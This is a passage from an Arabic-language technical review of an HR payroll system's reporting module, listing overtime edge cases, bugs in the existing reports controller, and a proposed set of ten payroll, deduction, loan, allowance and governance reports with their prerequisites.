| وردية ليلية تعبر منتصف الليل | ⚠️ **مكسور**: `checkOut − checkIn` بلا لفّ منتصف الليل → سالب → صفر. يمسّ المسارين ② و③ (`attendance.service.ts:1094, 1133, 1205-1208`) |
| طلب أوفرتايم على يوم إجازة معتمدة | لازم رفض أو تحويل الإجازة — حاليًا مفيش تحقق |
| قيدان في نفس اليوم (مكتشف + مطلوب) | `detectOvertime:1214` بيدّي أولوية لـ`PRE_REQUESTED` ويرجع فورًا — فمفيش ازدواج ✔ |
| قفل رجعي بعد صرف المسير | لازم `status = 'PAID'` يحميه من الحذف؛ التصحيح يكون بقيد `EmployeeObligation` نوع `DEBIT` في المسير التالي لا بحذف تاريخي |
| الموظف مستثنى من الحضور (البند ⑨) | لا أوفرتايم له أصلًا — الفحص يُضاف مع حقل `attendanceExempt` |

---

### ٥-٤) التقارير والتحليلات

#### الحالة عندنا الآن

الموجود: `api/src/reports/reports.controller.ts` (161 سطرًا) — **٦ نقاط نهاية فقط**: `headcount` · `attendance?month` · `leaves?year` · `payroll` · `overtime?month` · `requests`. الواجهة `src/app/payroll/reports/page.tsx` (284 سطرًا) بتستهلك `/reports/payroll`.

**٣ ملاحظات على الموجود:**

| # | الملاحظة | الدليل |
|---|---|---|
| R1 | 🐞 `/reports/payroll` بيعمل `JOIN branches b ON b.id = r.branchId` — **INNER JOIN**. مسيرات `COMPANY/DEPARTMENT/TEAM/CUSTOM` عندها `branchId = null` → **بتختفي من التقرير تمامًا** | `reports.controller.ts:104` |
| R2 | تقرير الخصومات بيجمّع **٤ أعمدة ثابتة** فقط (`lateness, unpaidLeave, loans, overtime`) — مفيش تفصيل بالنوع ولا بالقسم ولا بالمدير | `reports.controller.ts:112-120` |
| R3 | مفيش تقرير للسلف، ولا للبدلات، ولا مقارنة بين مسيرين، ولا تقرير حوكمة | — |

#### مبادئ عامة لأي تقرير جديد (لازم تُطبَّق على الكل)

| المبدأ | التفصيل |
|---|---|
| **مصدر الحقيقة = لقطة المسير** | التقارير تقرأ من `payroll_items` + `breakdown` **لا** تعيد الحساب. المسير لقطة تاريخية — إعادة الحساب بعد سنة بتدّي أرقام مختلفة (الراتب اتغيّر، الأقساط اتقفلت) |
| **نطاق الصلاحية** | كل استعلام مقيَّد بـ`branchScopeOf(user)` (نمط `reports.controller.ts:17-20`) + إضافة نطاق القسم والمدير المباشر — علشان المدير يشوف فريقه بس |
| **فلاتر موحّدة** | `runId` أو `period` · `branchId` · `departmentId` · `managerId` · `employeeStatus` · `costCenterId` |
| **تصدير** | Excel (للتحليل) + PDF (للتوقيع والأرشفة) على كل تقرير بلا استثناء |
| **أمان الاستعلام** | التقارير الحالية بتحقن `${month}` و`${year}` في نص SQL — محمية بـregex (`reports.controller.ts:7-8, 50, 72`) لكن أي فلتر جديد **لازم parameterized** |

#### حزمة التقارير المقترحة (١٠ تقارير)

##### ① كشف رواتب المسير — تفصيلي
**الغرض:** المستند الرسمي للصرف والتوقيع.
**السؤال:** «كل موظف بياخد كام بالضبط وليه؟»

| العمود | المصدر |
|---|---|
| كود الموظف · الاسم · الفرع · القسم · المسمى | `employees` |
| الأساسي · البدلات (مفصَّلة: سكن/انتقال/هاتف/طبيعة عمل/أخرى) | `payroll_items.basicSalary/allowances` ⚠️ **التفصيل غير متاح اليوم** — عمود واحد مجمَّع (`payroll.entities.ts:116-117`) |
| ساعات الأوفرتايم · مبلغه | `overtimeHours, overtimeAmount` |
| إضافات أخرى (مكافآت/تسويات) | `otherAdditions` |
| دقائق التأخير · خصم التأخير | `lateMinutes, latenessDeduction` |
| أيام الغياب · خصم الغياب | `absenceDays, absenceDeduction` |
| أيام إجازة بلا راتب · خصمها | `unpaidLeaveDays, unpaidLeaveDeduction` |
| قسط السلفة | `loanInstallments` |
| خصومات أخرى | `otherDeductions` |
| **الصافي** · طريقة الصرف · الحساب البنكي | `netPay, payMethod` |

##### ② كشف رواتب المسير — ملخّص
**الغرض:** الاعتماد الإداري وتحويل البنك.
**السؤال:** «إجمالي المسير كام وموزّع إزاي؟»
**الأعمدة:** الفرع/القسم · عدد الموظفين · إجمالي المستحقات · إجمالي الخصومات · **صافي المجموعة** · التوزيع حسب طريقة الصرف (تحويل/كاش/فيزا) · نسبة كل مجموعة من إجمالي المسير.

##### ③ تقرير الخصومات حسب النوع والقسم والمدير
**الغرض:** كشف مصادر الخصم وعدالته.
**السؤال:** «مين بينزّل خصومات أكتر؟ وهل في قسم فيه خصومات شاذّة؟»
**الأعمدة:** نوع الخصم (جودة/التزام/إداري/إنتاجية/تأخير/غياب) · القسم · المدير الذي أنزله · عدد الحالات · إجمالي المبلغ · متوسط الخصم للموظف · **نسبته من إجمالي أجور القسم** · اتجاه شهري.
> 🔴 **مانع تنفيذي:** التقرير ده **مستحيل اليوم**. `EmployeeObligation.category` حقل **نصّي حر** بلا جدول ولا تحقق (`financial.entities.ts:71-74`، و`obligations.service.ts:48` بيقبل أي نص)، ومفيش عمود `createdByUserId` مستهلك في أي تقرير. **متطلب سابق: كيان `DeductionType` + FK + استهلاك `createdByUserId`** (البند ⑦).

##### ④ تقرير التأخير والغياب مقابل الخصم
**الغرض:** الجسر بين الحضور والمال — أهم تقرير للاعتراضات.
**السؤال:** «الخصم ده جاي منين بالظبط؟»
**الأعمدة (مستوى اليوم):** التاريخ · حالة اليوم · وقت الوردية · وقت البصمة · دقائق التأخير · دقائق الإذن بخصم · **الشريحة المطبَّقة** · طريقة الخصم (كسر يوم/دقيقة/مضاعف) · **المبلغ المخصوم لهذا اليوم** · هل معفى؟ ومن أعفاه؟
**الجاهزية:** ✅ البيانات موجودة — `breakdown.attendanceDayIds` و`absentDates` بيتسجّلوا فعلًا (`payroll.service.ts:376-393`). الناقص: تسجيل **رقم الشريحة والمبلغ لكل يوم** داخل `breakdown` (حاليًا الخصم مجمَّع).

##### ⑤ تقرير الأوفرتايم — مُكتشف مقابل مطلوب
**الغرض:** كشف الفجوة بين ما اشتغله الموظف وما اتدفع له. **ده التقرير اللي هيكشف الخلل في المسار ③ فورًا.**
**السؤال:** «فيه أوفرتايم اتعمل ومااتدفعش؟ وفيه أوفرتايم اتدفع بلا اعتماد؟»

| العمود | المصدر |
|---|---|
| الموظف · التاريخ · نوع اليوم | `overtime_entries` + `dayKind` |
| المصدر (بصمة / طلب موظف) | `source` |
| ساعات مطلوبة · ساعات فعلية · **ساعات مدفوعة** | `hoursRequested, hoursActual, payableHours` |
| **الفارق (فعلي − مدفوع)** | محسوب — **العمود الحارس** |
| المُضاعِف · المبلغ | `rate` × `hourRate` |
| الحالة · حالة الفترة (مفتوحة/مقفولة) | `status` + `isOvertimeOpen(date)` |
| المعتمِد وتاريخ الاعتماد | من سلسلة الطلب |

> **صف الإنذار:** `source = 'PRE_REQUESTED' AND status = 'APPROVED' AND payableHours IS NULL` → **دي بالضبط قائمة الحالات المكسورة**. شغّل الاستعلام ده النهارده وهتطلع كل الطلبات اللي اتعتمدت واتدفعت صفرًا.

##### ⑥ تقرير السلف والأرصدة القائمة
**الغرض:** إدارة المخاطر المالية والتدفق النقدي.
**السؤال:** «فلوسنا عند الموظفين كام؟ وهل في حد بياخد سلف بشكل متكرر؟»
**الأعمدة:** الموظف · نوع السلفة (عادية/استثنائية) · أصل المبلغ · تاريخ الصرف · عدد الأشهر · المسدَّد · **الرصيد القائم** · عدد الأقساط المتبقية · تاريخ آخر قسط · **نسبة الرصيد من الراتب الشهري** · هل تجاوزت السقف؟ ومن أجاز؟ · حالة الموظف (نشط/منتهي).
**إجماليات:** إجمالي الرصيد القائم على مستوى الشركة · التوزيع بالفرع · **المتوقع تحصيله شهريًا للـ6 أشهر الجاية** (تدفق نقدي) · قائمة «الديون المعرّضة» (موظفون في دورة إنهاء خدمة برصيد قائم).

##### ⑦ تقرير البدلات
**الغرض:** ضبط تكلفة البدلات ومنع التفاوت غير المبرر.
**السؤال:** «كام بنصرف بدلات؟ ومين له بدلات مش موجودة في درجته؟»
**الأعمدة:** الموظف · نوع البدل · القيمة · دائم/مؤقت · تاريخ البدء والانتهاء · مَن أضافه · **نسبته من الأساسي** · مقارنة بمتوسط نفس المسمّى/الدرجة.
> 🔴 **مانع تنفيذي:** مفيش كتالوج بدلات أصلًا — البدلات أعمدة ثابتة على `Employee` وتُجمَع في رقم واحد (`payroll.service.ts:227-230`)، و`phoneAllowance` و`workNatureAllowance` (`employee.entity.ts:214, 217`) **مش داخلين في الجمع** ومعتمدين على إدخالهم يدويًا في `otherAllowance`. **متطلب سابق: كيان `AllowanceType` + تفصيل البدلات في `PayrollItem`** (البند ⑥).

##### ⑧ مقارنة مسير بمسير / شهر بشهر (Variance)
**الغرض:** الرقابة — كشف الشذوذ قبل الصرف مش بعده.
**السؤال:** «إيه اللي اتغيّر عن الشهر اللي فات وليه؟»
**الأعمدة:** البند (أساسي/بدلات/أوفرتايم/تأخير/غياب/سلف/أخرى) · قيمة المسير السابق · قيمة المسير الحالي · **الفرق المطلق** · **الفرق %** · عدد الموظفين المتأثرين.
**قسم تفصيلي على مستوى الموظف — كشف الشذوذ:**

| السطر | الشرط | القراءة |
|---|---|---|
| موظفون في المسير الحالي وليسوا في السابق | LEFT JOIN | تعيينات جديدة — أو **ازدواج مسير** ⚠️ |
| موظفون في السابق وليسوا في الحالي | LEFT JOIN | استقالات — أو **سقوط من النطاق** ⚠️ |
| صافي تغيّر > 20% | حد قابل للضبط | يستدعي مراجعة يدوية إلزامية |
| صافي ≤ 0 أو سالب | `netPay <= 0` | 🚨 **حاجز صرف** — يمنع اعتماد المسير |

##### ⑨ تقرير الاستثناءات والإعفاءات (تقرير الحوكمة) 🔑
**الغرض:** الإجابة على «مين أعفى مين وليه؟» — التقرير اللي بيحمي النظام من التلاعب.
**السؤال:** «هل في حد بيلغي خصومات ناس معيّنة بشكل متكرر؟»

| العمود | التفصيل |
|---|---|
| نوع الاستثناء | إعفاء من خصم · مكافأة فردية · تجاوز سقف سلفة · استثناء من الحضور · تعديل يدوي على بند مسير · قيد أوفرتايم بلا اعتماد |
| الموظف المستفيد · الفرع/القسم | |
| **قيمة الأثر المالي** | المبلغ اللي مااتخصمش أو اللي اتصرف زيادة |
| المسير/الفترة | |
| **من نفّذ** (userId + الاسم + الدور) | |
| **السبب المسجَّل** | ⚠️ **حقل إلزامي** — ممنوع إعفاء بلا سبب |
| المعتمِد الأعلى (لو التجاوز يحتاج اعتماد ثانٍ) | |
| التاريخ والوقت | |

**التحليلات فوق التقرير — دي الجوهر:**
- **ترتيب المنفّذين** بعدد الاستثناءات وقيمتها الإجمالية → «مدير الجودة أعفى 14 موظفًا بقيمة 12,400 ج الشهر ده».
- **ترتيب المستفيدين** بتكرار الإعفاء → «الموظف س اتعفى 6 مرات في 6 شهور».
- **الاستثناءات بلا سبب مكتوب** → قائمة مخالفات مباشرة.
- **الحالات اللي المنفّذ فيها = المستفيد** → تضارب مصالح صريح.
- **قيمة الاستثناءات كنسبة من إجمالي المسير** → مؤشر صحة واحد للإدارة العليا.

> 🔴 **مانع تنفيذي:** التقرير ده **مستحيل تمامًا اليوم**. مفيش كيان `PayrollExemption` ولا حقل إعفاء على `PayrollItem` (`payroll.entities.ts:100-165`) ولا على `Employee`. المفتاح الوحيد `payroll.late_deduction_enabled` عام للشركة كلها (`payroll.service.ts:199-200`) — يا الكل يا مفيش حد. **متطلب سابق: كيان الإعفاء بالبند ⑧.**
> **قاعدة تصميم:** كل استثناء **لازم** يخلّف صفًا في جدول تدقيق غير قابل للحذف (append-only) مع `userId` و`reason` و`timestamp`. من غير الإلزام ده، التقرير بيتحوّل لمساحة فاضية.

##### ⑩ تقرير جاهزية المسير (Pre-flight) — قبل الاعتماد لا بعده
**الغرض:** يمنع صرف مسير معطوب — أرخص بكتير من التصحيح بعد التحويل البنكي.
**السؤال:** «المسير ده آمن للاعتماد؟»

| الفحص | الشرط | الخطورة |
|---|---|---|
| صافي سالب أو صفر | `netPay <= 0` | 🚨 حاجز |
| موظف في أكثر من مسير لنفس الفترة | من `payroll_run_members` | 🚨 حاجز — **الحاجز ده مش موجود اليوم** (`payroll.entities.ts:82-95` كيان يُكتب ولا يُقرأ) |
| موظف نشط خارج كل المسيرات | LEFT JOIN على `employees` | ⚠️ إنذار |
| أوفرتايم معتمد بساعات مدفوعة فارغة | `payableHours IS NULL` | ⚠️ إنذار — **مؤشّر الخلل في المسار ③** |
| بيانات بنكية ناقصة و`payMethod='transfer'` | `IBAN IS NULL` | 🚨 حاجز |
| خصم يتجاوز أرضية الصافي | `deductions > gross × (1 − minNetPercent)` | ⚠️ إنذار |
| قسط سلفة استحق قبل الفترة ولم يُخصم | `dueDate < startDate AND status='DUE'` | ⚠️ إنذار — **القسط الفايت الساقط** |
| تغيّر > 20% عن المسير السابق | من تقرير ⑧ | ⚠️ مراجعة |

#### مصفوفة الجاهزية — ما الذي يمنع كل تقرير اليوم

| التقرير | جاهز؟ | المتطلب السابق |
|---|---|---|
| ① كشف تفصيلي | 🟡 جزئي | تفصيل البدلات في `PayrollItem` |
| ② كشف ملخّص | ✅ جاهز | إصلاح INNER JOIN (`reports.controller.ts:104`) |
| ③ خصومات بالنوع | ❌ محجوب | كيان `DeductionType` (⑦) |
| ④ تأخير/غياب مقابل الخصم | 🟡 جزئي | تفصيل الشريحة والمبلغ اليومي في `breakdown` |
| ⑤ أوفرتايم | ✅ **جاهز فورًا** | لا شيء — وهيكشف الخلل ⑫③ فورًا |
| ⑥ السلف | 🟡 جزئي | `remainingAmount` + `loanType` على `Loan` |
| ⑦ البدلات | ❌ محجوب | كيان `AllowanceType` (⑥) |
| ⑧ Variance | ✅ جاهز | لا شيء |
| ⑨ الاستثناءات (حوكمة) | ❌ محجوب | كيان `PayrollExemption` (⑧) |
| ⑩ جاهزية المسير | 🟡 جزئي | قراءة `PayrollRunMember` |

**ترتيب التنفيذ الموصى به:** ⑤ و⑧ و② أولًا (جاهزة، وقيمتها الرقابية فورية) ← ثم ⑩ (حاجز الصرف) ← ثم ③ و⑦ و⑨ بعد ما كيانات الأنواع والإعفاءات تنزل.